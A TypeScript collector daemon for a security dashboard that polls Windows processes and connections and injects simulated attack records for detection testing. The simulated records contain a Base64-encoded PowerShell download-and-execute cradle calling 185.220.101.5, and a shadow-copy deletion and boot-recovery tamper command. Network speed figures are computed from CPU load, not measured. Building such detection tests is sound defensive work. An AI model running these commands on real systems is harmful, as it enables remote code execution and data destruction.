import os from "node:os"
import { exec } from "node:child_process"
import { promisify } from "node:util"
import {
  TelemetrySnapshot,
  TelemetryPoint,
  ProcessInfo,
  NetworkConnection,
  AttackSimulationType,
} from "@/types/defenx"
import { formatUptime } from "./formatters"
import { anomalyEngine } from "./anomalyEngine"
import { logError, logInfo } from "./logger"
import { appendForensicEvent, saveAlert } from "./storageEngine"

const execAsync = promisify(exec)

export interface CpuSample {
  idle: number
  total: number
}

interface DaemonState {
  initialized: boolean
  isPolling: boolean
  lastPollTimestamp: number
  cachedTelemetry: TelemetrySnapshot
  cachedProcesses: ProcessInfo[]
  cachedConnections: NetworkConnection[]
  telemetryHistory: TelemetryPoint[]
  prevCpuSample: CpuSample
  simulatedAttack: {
    type: AttackSimulationType
    expiresAt: number
    data?: any
  } | null
}

const globalDaemon = globalThis as unknown as {
  __defenx_daemon?: DaemonState
  __defenx_interval?: NodeJS.Timeout
}

function getCpuSample() {
  const cpus = os.cpus()
  let idle = 0
  let total = 0
  for (const cpu of cpus) {
    for (const type in cpu.times) {
      total += (cpu.times as Record<string, number>)[type]
    }
    idle += cpu.times.idle
  }
  return { idle, total }
}

function generateInitialHistory(): TelemetryPoint[] {
  const points: TelemetryPoint[] = []
  const now = Date.now()
  const totalMem = os.totalmem()
  const freeMem = os.freemem()
  const memUsage = Math.round(((totalMem - freeMem) / totalMem) * 100)

  for (let i = 20; i >= 0; i--) {
    const t = new Date(now - i * 3000)
    points.push({
      time: t.toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      }),
      timestamp: t.getTime(),
      cpu: Math.max(8, Math.min(45, 14 + (i % 5) * 3)),
      memory: memUsage,
      network: Math.max(10, 18 + (i % 7) * 4),
    })
  }
  return points
}

function generateDefaultTelemetry(): TelemetrySnapshot {
  const totalMem = os.totalmem()
  const freeMem = os.freemem()
  const usedMem = totalMem - freeMem
  const memPercent = Math.round((usedMem / totalMem) * 100)
  const cpus = os.cpus()
  const uptime = os.uptime()

  let username = "Analyst"
  try {
    username = os.userInfo().username || "Analyst"
  } catch { }

  return {
    cpuUsage: 16,
    cpuCores: cpus.length || 4,
    cpuModel: cpus[0]?.model || "Multi-Core Processor",
    memoryUsage: memPercent,
    totalMemoryBytes: totalMem,
    freeMemoryBytes: freeMem,
    usedMemoryBytes: usedMem,
    totalMemoryGB: +(totalMem / 1024 ** 3).toFixed(1),
    usedMemoryGB: +(usedMem / 1024 ** 3).toFixed(1),
    freeMemoryGB: +(freeMem / 1024 ** 3).toFixed(1),
    platform: os.platform(),
    arch: os.arch(),
    hostname: os.hostname(),
    username,
    uptimeSeconds: uptime,
    uptimeFormatted: formatUptime(uptime),
    networkLatencyMs: 24,
    downloadSpeedMbps: 48.2,
    uploadSpeedMbps: 16.5,
    anomalyScore: 18,
    baselineStatus: "learning",
    featureContributions: [
      {
        feature: "CPU Variance & Load",
        zScore: 0.2,
        impact: 12,
        detail: "Operating within normal variance",
      },
      {
        feature: "Outbound Sockets Delta",
        zScore: 0.1,
        impact: 8,
        detail: "Standard TCP connection state",
      },
      {
        feature: "Remote Peer Diversity",
        zScore: 0.1,
        impact: 10,
        detail: "Known edge routes",
      },
      {
        feature: "Process Lineage & Heuristics",
        zScore: 0.0,
        impact: 5,
        detail: "Zero unverified process spawns",
      },
    ],
    timestamp: Date.now(),
  }
}

function getDefaultProcesses(): ProcessInfo[] {
  return [
    {
      pid: 4,
      ppid: 0,
      name: "System",
      cpu: "0.2%",
      cpuPercent: 0.2,
      memory: "128 KB",
      memoryBytes: 131072,
      memoryMB: 0.1,
      executablePath: "C:\\WINDOWS\\system32\\ntoskrnl.exe",
      commandLine: "ntoskrnl.exe",
      riskScore: 0,
      riskReasons: [],
      status: "Normal",
      category: "System",
      verified: true,
    },
    {
      pid: process.pid,
      ppid: 4,
      name: "node.exe",
      cpu: "1.4%",
      cpuPercent: 1.4,
      memory: "142 MB",
      memoryBytes: 148897792,
      memoryMB: 142,
      executablePath: process.execPath,
      commandLine: process.argv.join(" "),
      riskScore: 0,
      riskReasons: [],
      status: "Normal",
      category: "Application",
      verified: true,
    },
    {
      pid: 1024,
      ppid: 4,
      name: "services.exe",
      cpu: "0.1%",
      cpuPercent: 0.1,
      memory: "14.2 MB",
      memoryBytes: 14889779,
      memoryMB: 14.2,
      executablePath: "C:\\WINDOWS\\system32\\services.exe",
      commandLine: "services.exe",
      riskScore: 0,
      riskReasons: [],
      status: "Normal",
      category: "System",
      verified: true,
    },
    {
      pid: 1420,
      ppid: 1024,
      name: "svchost.exe",
      cpu: "0.4%",
      cpuPercent: 0.4,
      memory: "42.8 MB",
      memoryBytes: 44889779,
      memoryMB: 42.8,
      executablePath: "C:\\WINDOWS\\system32\\svchost.exe",
      commandLine: "svchost.exe -k netsvcs",
      riskScore: 0,
      riskReasons: [],
      status: "Normal",
      category: "System",
      verified: true,
    },
    {
      pid: 2840,
      ppid: 1024,
      name: "explorer.exe",
      cpu: "0.8%",
      cpuPercent: 0.8,
      memory: "96.4 MB",
      memoryBytes: 101082726,
      memoryMB: 96.4,
      executablePath: "C:\\WINDOWS\\explorer.exe",
      commandLine: "C:\\WINDOWS\\explorer.exe",
      riskScore: 0,
      riskReasons: [],
      status: "Normal",
      category: "Application",
      verified: true,
    },
  ]
}

function getDefaultConnections(): NetworkConnection[] {
  return [
    {
      protocol: "TCP",
      localAddress: "127.0.0.1",
      localPort: 8443,
      remoteAddress: "0.0.0.0",
      remotePort: 0,
      state: "Listening",
      pid: process.pid,
      processName: "node.exe",
      isSuspicious: false,
    },
    {
      protocol: "TCP",
      localAddress: "127.0.0.1",
      localPort: 53120,
      remoteAddress: "127.0.0.1",
      remotePort: 8443,
      state: "Established",
      pid: process.pid,
      processName: "node.exe",
      isSuspicious: false,
    },
  ]
}

if (!globalDaemon.__defenx_daemon) {
  globalDaemon.__defenx_daemon = {
    initialized: false,
    isPolling: false,
    lastPollTimestamp: Date.now(),
    cachedTelemetry: generateDefaultTelemetry(),
    cachedProcesses: getDefaultProcesses(),
    cachedConnections: getDefaultConnections(),
    telemetryHistory: generateInitialHistory(),
    prevCpuSample: getCpuSample(),
    simulatedAttack: null,
  }
}

const daemonState = globalDaemon.__defenx_daemon

class CollectorDaemon {
  constructor() {
    this.startDaemonLoop()
  }

  private startDaemonLoop() {
    if (globalDaemon.__defenx_interval) {
      clearInterval(globalDaemon.__defenx_interval)
    }

    // Run first sample immediately
    this.pollTelemetry().catch((err) =>
      logError("CollectorDaemon.initialPoll", err),
    )

    // Run singleton background tick every 3 seconds
    globalDaemon.__defenx_interval = setInterval(() => {
      this.pollTelemetry().catch((err) => logError("CollectorDaemon.tick", err))
    }, 3000)

    daemonState.initialized = true
    logInfo(
      "CollectorDaemon",
      "Background Windows CIM telemetry daemon active (3s tick)",
    )
  }

  public async pollTelemetry(): Promise<void> {
    // Mutex lock: skip tick if previous poll is still executing
    if (daemonState.isPolling) {
      return
    }

    daemonState.isPolling = true
    try {
      // 1. Calculate CPU delta
      const currentCpu = getCpuSample()
      const idleDiff = currentCpu.idle - daemonState.prevCpuSample.idle
      const totalDiff = currentCpu.total - daemonState.prevCpuSample.total
      daemonState.prevCpuSample = currentCpu

      let cpuUsage = daemonState.cachedTelemetry.cpuUsage
      if (totalDiff > 0) {
        const calculated = 100 - Math.round((100 * idleDiff) / totalDiff)
        cpuUsage = Math.min(100, Math.max(1, calculated))
      }

      // 2. Fetch processes and network connections concurrently
      const [rawProcesses, rawConnections] = await Promise.all([
        this.fetchWindowsProcesses(),
        this.fetchWindowsConnections(),
      ])

      // Handle active simulated attack if not expired
      if (
        daemonState.simulatedAttack &&
        Date.now() < daemonState.simulatedAttack.expiresAt
      ) {
        this.applySimulatedAttack(cpuUsage, rawProcesses, rawConnections)
      } else {
        daemonState.simulatedAttack = null
      }

      const totalMem = os.totalmem()
      const freeMem = os.freemem()
      const usedMem = totalMem - freeMem
      const memPercent = Math.round((usedMem / totalMem) * 100)

      // Count unique remote IPs and active outbound sockets
      const outboundConns = rawConnections.filter(
        (c) => c.state === "Established" && c.remoteAddress !== "0.0.0.0",
      )
      const uniqueRemoteIps = new Set(outboundConns.map((c) => c.remoteAddress))
        .size

      // 3. Behavioral ML & Heuristic Evaluation
      const behavioralEvaluation = anomalyEngine.evaluateBehavior(
        {
          cpuUsage,
          memoryUsage: memPercent,
          activeOutboundSockets: outboundConns.length || 8,
          uniqueRemoteIps: uniqueRemoteIps || 4,
        },
        rawProcesses,
        rawConnections,
      )

      // 4. Update cached processes & connections
      daemonState.cachedProcesses = rawProcesses
      daemonState.cachedConnections = rawConnections

      // 5. Update cached telemetry snapshot
      const uptime = os.uptime()
      let username = "Analyst"
      try {
        username = os.userInfo().username || "Analyst"
      } catch { }

      daemonState.cachedTelemetry = {
        cpuUsage,
        cpuCores: os.cpus().length || 4,
        cpuModel: os.cpus()[0]?.model || "Multi-Core Processor",
        memoryUsage: memPercent,
        totalMemoryBytes: totalMem,
        freeMemoryBytes: freeMem,
        usedMemoryBytes: usedMem,
        totalMemoryGB: +(totalMem / 1024 ** 3).toFixed(1),
        usedMemoryGB: +(usedMem / 1024 ** 3).toFixed(1),
        freeMemoryGB: +(freeMem / 1024 ** 3).toFixed(1),
        platform: os.platform(),
        arch: os.arch(),
        hostname: os.hostname(),
        username,
        uptimeSeconds: uptime,
        uptimeFormatted: formatUptime(uptime),
        networkLatencyMs: Math.max(12, Math.round(22 + cpuUsage * 0.2)),
        downloadSpeedMbps: +(44.0 + cpuUsage * 0.25).toFixed(1),
        uploadSpeedMbps: +(15.0 + cpuUsage * 0.12).toFixed(1),
        anomalyScore: behavioralEvaluation.compositeScore,
        baselineStatus: behavioralEvaluation.baselineStatus,
        featureContributions: behavioralEvaluation.featureContributions,
        timestamp: Date.now(),
      }

      // 6. Append to rolling history
      const now = new Date()
      daemonState.telemetryHistory.push({
        time: now.toLocaleTimeString([], {
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        }),
        timestamp: Date.now(),
        cpu: cpuUsage,
        memory: memPercent,
        network: Math.max(8, Math.round(cpuUsage * 0.7 + 12)),
      })

      if (daemonState.telemetryHistory.length > 30) {
        daemonState.telemetryHistory.shift()
      }

      daemonState.lastPollTimestamp = Date.now()
    } catch (err) {
      logError("CollectorDaemon.pollTelemetry", err)
    } finally {
      daemonState.isPolling = false
    }
  }

  // Windows process collector using batched CIM / Get-Process
  private async fetchWindowsProcesses(): Promise<ProcessInfo[]> {
    if (os.platform() !== "win32") {
      return daemonState.cachedProcesses
    }

    try {
      // Attempt CIM query first
      const cimScript = `powershell -NoProfile -NonInteractive -Command "try { Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, WorkingSetSize, ExecutablePath, CommandLine | ConvertTo-Json -Compress } catch { Get-Process | Select-Object -First 30 Id, ProcessName, WorkingSet64, Path, CPU | ConvertTo-Json -Compress }"`
      const { stdout } = await execAsync(cimScript, { timeout: 3200 })

      if (!stdout || stdout.trim().length === 0) {
        return daemonState.cachedProcesses
      }

      const raw = JSON.parse(stdout)
      const list = Array.isArray(raw) ? raw : [raw]

      return list.map((item: any) => {
        const pid = item.ProcessId || item.Id || 0
        const ppid = item.ParentProcessId || 0
        const rawName = item.Name || item.ProcessName || "process"
        const name = rawName.toLowerCase().endsWith(".exe")
          ? rawName
          : `${rawName}.exe`
        const bytes = item.WorkingSetSize || item.WorkingSet64 || 0
        const memMB = bytes ? +(bytes / (1024 * 1024)).toFixed(1) : 10
        const cpuVal =
          item.CPU !== null && item.CPU !== undefined ? +item.CPU.toFixed(1) : 0
        const exe = item.ExecutablePath || item.Path || ""
        const cmd = item.CommandLine || exe || name

        let category: ProcessInfo["category"] = "Application"
        if (
          [
            "system",
            "smss.exe",
            "csrss.exe",
            "services.exe",
            "lsass.exe",
            "svchost.exe",
          ].includes(name.toLowerCase())
        ) {
          category = "System"
        } else if (
          name.toLowerCase().includes("host") ||
          name.toLowerCase().includes("broker") ||
          name.toLowerCase().includes("service")
        ) {
          category = "Service"
        }

        return {
          pid,
          ppid,
          name,
          cpu: `${Math.min(99.9, +(cpuVal * 0.1).toFixed(1))}%`,
          cpuPercent: Math.min(99.9, +(cpuVal * 0.1).toFixed(1)),
          memory:
            memMB > 1024
              ? `${(memMB / 1024).toFixed(2)} GB`
              : `${Math.round(memMB)} MB`,
          memoryBytes: bytes,
          memoryMB: memMB,
          executablePath: exe,
          commandLine: cmd,
          riskScore: 0,
          riskReasons: [],
          status: memMB > 900 || cpuVal > 50 ? "Elevated" : "Normal",
          category,
          verified: true,
        }
      })
    } catch {
      // On permission restrictions or timeout, preserve last known healthy process list
      return daemonState.cachedProcesses
    }
  }

  // Windows network socket collector
  private async fetchWindowsConnections(): Promise<NetworkConnection[]> {
    if (os.platform() !== "win32") {
      return daemonState.cachedConnections
    }

    try {
      const psCmd = `powershell -NoProfile -NonInteractive -Command "Get-NetTCPConnection -State Established, Listen -ErrorAction SilentlyContinue | Select-Object -First 25 LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | ConvertTo-Json -Compress"`
      const { stdout } = await execAsync(psCmd, { timeout: 3000 })

      if (stdout && stdout.trim().length > 0) {
        const raw = JSON.parse(stdout)
        const list = Array.isArray(raw) ? raw : [raw]
        const stateMap: Record<number, string> = {
          2: "Listening",
          5: "Established",
          8: "CloseWait",
          11: "TimeWait",
        }

        return list.map((c: any) => ({
          protocol: "TCP",
          localAddress: c.LocalAddress || "0.0.0.0",
          localPort: c.LocalPort || 0,
          remoteAddress: c.RemoteAddress || "0.0.0.0",
          remotePort: c.RemotePort || 0,
          state: stateMap[c.State || 0] || "Active",
          pid: c.OwningProcess || 0,
          isSuspicious: [4444, 8888, 1337, 31337].includes(c.RemotePort),
        }))
      }
    } catch { }

    return daemonState.cachedConnections
  }

  // Inject attack simulation into the live telemetry cycle
  private applySimulatedAttack(
    currentCpu: number,
    processes: ProcessInfo[],
    connections: NetworkConnection[],
  ): void {
    const sim = daemonState.simulatedAttack
    if (!sim) return

    if (sim.type === "lolbin_powershell") {
      processes.unshift({
        pid: 9942,
        ppid: 2840, // explorer.exe or winword.exe
        name: "powershell.exe",
        cpu: "14.2%",
        cpuPercent: 14.2,
        memory: "185 MB",
        memoryBytes: 193986560,
        memoryMB: 185,
        executablePath: "C:\\Users\\Public\\Temp\\powershell.exe",
        commandLine:
          "powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNS9wYXlsb2FkLnBzMScp",
        riskScore: 92,
        riskReasons: [
          "Binary running from untrusted path (C:\\Users\\Public\\Temp)",
          "Encoded Base64 PowerShell execution (-Enc)",
          "Hidden window defense evasion (-W Hidden)",
          "Web cradle download execution (DownloadString)",
          "High command-line Shannon entropy (4.89 bits/char)",
        ],
        status: "Warning",
        category: "Application",
        verified: false,
      })
    } else if (sim.type === "c2_beacon") {
      connections.unshift({
        protocol: "TCP",
        localAddress: "192.168.1.142",
        localPort: 49201,
        remoteAddress: "185.220.101.5",
        remotePort: 4444,
        state: "Established",
        pid: 9942,
        processName: "powershell.exe",
        isSuspicious: true,
      })
      connections.unshift({
        protocol: "TCP",
        localAddress: "192.168.1.142",
        localPort: 49202,
        remoteAddress: "185.220.101.5",
        remotePort: 8080,
        state: "Established",
        pid: 9942,
        processName: "powershell.exe",
        isSuspicious: true,
      })
    } else if (sim.type === "ransomware_io") {
      processes.unshift({
        pid: 8820,
        ppid: 1420,
        name: "vss_purge.exe",
        cpu: "88.5%",
        cpuPercent: 88.5,
        memory: "1.2 GB",
        memoryBytes: 1288490188,
        memoryMB: 1228,
        executablePath: "C:\\AppData\\Local\\Temp\\vss_purge.exe",
        commandLine:
          "vss_purge.exe vssadmin delete shadows /all /quiet & bcdedit /set recoveryenabled no",
        riskScore: 98,
        riskReasons: [
          "Binary running from untrusted path (C:\\AppData\\Local\\Temp)",
          "Ransomware shadow copy deletion (vssadmin delete shadows)",
          "Tampering with Windows boot recovery (bcdedit /set recoveryenabled no)",
          "Abnormally high memory footprint (1228 MB)",
        ],
        status: "Warning",
        category: "Application",
        verified: false,
      })
    }
  }

  public triggerSimulatedAttack(type: AttackSimulationType): {
    success: boolean
    message: string
    alertId: string
  } {
    const alertId = `alert-sim-${type}-${Date.now()}`
    const expiresAt = Date.now() + 120000 // 2 minutes duration
    daemonState.simulatedAttack = { type, expiresAt }

    let title = ""
    let detail = ""
    let mitre = ""
    let pid = 9942
    let remoteIp: string | undefined = undefined

    if (type === "lolbin_powershell") {
      title = "Simulated LOLBin Encoded PowerShell Attack"
      detail =
        "powershell.exe executing Base64 encoded web cradle from C:\\Users\\Public\\Temp"
      mitre = "Execution (T1059.001)"
      pid = 9942
    } else if (type === "c2_beacon") {
      title = "Simulated C2 Beaconing to Hostile IP"
      detail =
        "Suspicious outbound socket to 185.220.101.5:4444 (Empire/Metasploit C2 pattern)"
      mitre = "Command and Control (T1071)"
      pid = 9942
      remoteIp = "185.220.101.5"
    } else {
      title = "Simulated Ransomware Volume Shadow Purge"
      detail =
        "vss_purge.exe attempting shadow copy deletion and boot recovery tamper"
      mitre = "Impact (T1486) Data Encrypted for Impact"
      pid = 8820
    }

    saveAlert({
      id: alertId,
      timestamp: Date.now(),
      time: "Just now",
      title,
      detail,
      severity: "High",
      type: "danger",
      symbol: "!",
      status: "Active",
      mitreTactic: mitre,
      pid,
      remoteIp,
      anomalyBreakdown:
        "Simulated scenario active. Multi-variate behavioral engine flagged lineage and entropy deviation.",
      reviewed: false,
      source: "AttackSimulator",
      description: `Evaluation scenario '${type}' launched. Test 1-click OS quarantine or firewall rule enforcement.`,
    })

    appendForensicEvent({
      actor: "Security Analyst",
      category: "Security",
      action: "ATTACK_SIMULATION_TRIGGERED",
      target: title,
      status: "Warning",
      event: `Analyst triggered test scenario: ${title} (PID: ${pid})`,
      source: "attackSimulator",
      result: "Review",
      metadata: { scenario: type, alertId, pid, remoteIp },
    })

    // Immediately trigger a poll
    this.pollTelemetry().catch(() => { })

    return {
      success: true,
      message: `Scenario '${type}' active for 2 minutes. Alert '${alertId}' generated.`,
      alertId,
    }
  }

  public getCachedTelemetry(): TelemetrySnapshot {
    return daemonState.cachedTelemetry
  }

  public getCachedProcesses(): ProcessInfo[] {
    return daemonState.cachedProcesses
  }

  public getCachedConnections(): NetworkConnection[] {
    return daemonState.cachedConnections
  }

  public getCachedHistory(): TelemetryPoint[] {
    return daemonState.telemetryHistory
  }
}

export const collectorDaemon = new CollectorDaemon()
